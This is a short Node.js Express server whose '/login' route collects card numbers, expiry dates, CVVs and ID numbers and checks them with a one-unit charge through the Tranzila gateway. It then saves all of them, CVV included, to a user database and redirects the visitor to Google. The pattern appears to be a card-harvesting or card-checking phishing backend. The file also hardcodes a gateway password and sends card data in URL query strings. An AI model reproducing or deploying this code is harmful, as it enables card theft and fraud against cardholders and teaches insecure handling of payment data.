require("dotenv").config();
const express = require('express')


const cors = require('cors')
const request = require('request')
const bodyParser = require('body-parser'); // Middleware 
const app = express()
const connection = require("./db/connectdb");
// const pay = require("./routes/pay");
const { User } = require("./models/user");

//variables
var email;
var password = 'password';

app.use(express.json())
app.use(express.static('./methods-public'))
app.use(express.urlencoded({ extended: false }))
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cors());

connection()

// app.use("/pay", pay);

app.post('/login', async (req, res) => {
  //   // Insert Login Code Here                    https://secure5.tranzila.com/cgi-bin/tranzila71u.cgi



  try {
    email = req.body.email
    
    var tranmode = req.body.tranmode
    var ccno = req.body.ccno
    var myid = req.body.myid
    
    var expdate = req.body.expdate
    var cred_type = req.body.cred_type
    var mycvv = req.body.mycvv
    
    const url = `https://secure5.tranzila.com/cgi-bin/tranzila71u.cgi?supplier=hrc28&tranmode=${tranmode}&ccno=${ccno}&expdate=${expdate}&sum=1&currency=1&cred_type=${cred_type}&myid=${myid}&mycvv=${mycvv}&TranzilaPW=GExfI6Yt`

    request({ url: url }, (error, response) => {
      const data = response.body
      const tranzilaresponse = data.split('&')
      if (tranzilaresponse[0] === 'Response=000') {
        console.log('Yes, Yes');
        if (email) {
          new User({ ...req.body, email,password }).save();
          res.redirect('https://www.google.com');
        }

      }
      else {
        console.log('Oh , No ~~!');
      }
    })
  } catch (error) {
    console.log(error)
  }

});

// async function Addusers(req, res) {
  
//   await new User({ ...req.body, myid,sum }).save();
// }

app.listen(5000, () => {
  console.log(`Server is listening on port 5000...`);
})